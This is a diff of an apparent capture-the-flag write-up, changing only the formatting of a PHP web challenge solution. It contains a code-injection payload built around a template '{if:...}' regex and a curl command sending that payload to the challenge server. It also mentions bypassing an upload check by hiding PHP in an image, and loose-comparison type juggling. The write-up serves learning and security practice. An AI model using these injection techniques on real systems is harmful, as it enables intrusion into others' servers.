@@ -176,8 +176,11 @@ end:
 
 After deobfuscating the source code of the app we can see that we need to validate this condition:
 ``{if: condition) action; //}payload{end if}`` 
+
 which regex is 
+
 `/\{if:\s*(.*?)\)\s*(.*?)\s*;\/\/\}(.*?)\{end if\}/is`
+
 lets test a simple phpinfo() payload with **`{if: 1); phpinfo();//}{end if}`**
 ```bash
 curl http://20.199.80.129:2022/?parse=%7Bif%3A+1%29%3B+phpinfo%28%29%3B%2F%2F%7D%7Bend+if%7D
@@ -230,6 +233,7 @@ else {
 ```
 
 We can find that there's a file upload functionality that checks the MIME type and the extension of the uploaded file, which is bypassable xD. And we can inject a php code in an image.
+
 Next is `/internal/api.php` :
 ```php
 <?php
@@ -392,7 +396,7 @@ First we got 2 types of comparisons in php:
 You can find more here:
 ![Pasted image 20250223221421](https://github.com/user-attachments/assets/b86f2412-2130-4cd7-87bf-3c593a412697)
 
-From this table we know that with **=*=*** we can get a ==TRUE== statement when sending a Boolean value
+From this table we know that with **=*=*** we can get a TRUE statement when sending a Boolean value
 ```php
 $ php -a
 Interactive shell 
